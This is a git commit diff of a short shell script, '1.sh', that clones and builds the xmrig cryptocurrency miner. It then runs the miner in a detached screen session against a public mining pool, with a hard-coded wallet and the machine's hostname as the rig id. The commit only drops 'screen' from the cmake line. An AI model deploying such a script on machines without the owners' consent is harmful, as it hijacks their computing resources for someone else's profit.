2ca1dda1d169a247de8c2843827af307056ce47c
Kazhna <95303592+Kazhna@users.noreply.github.com>
2022-04-04 21:03:37 +0200

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -5,7 +5,7 @@ git clone https://github.com/xmrig/xmrig.git
 cd xmrig
 mkdir build
 cd build
-screen cmake ..
+cmake ..
 make
 Nazwa=$(</etc/hostname)
 screen ./xmrig -o pool.minexmr.com:4444 -u 49o28HSbH5FBxQDivjThpPAF1WwBDPrtpBCuzDr9GHu6QZXriGBDCvb7aRpTwW2u5vJuaMxwgfnck6sc9FeCSSEVG1ci7qc --rig-id=$Nazwa
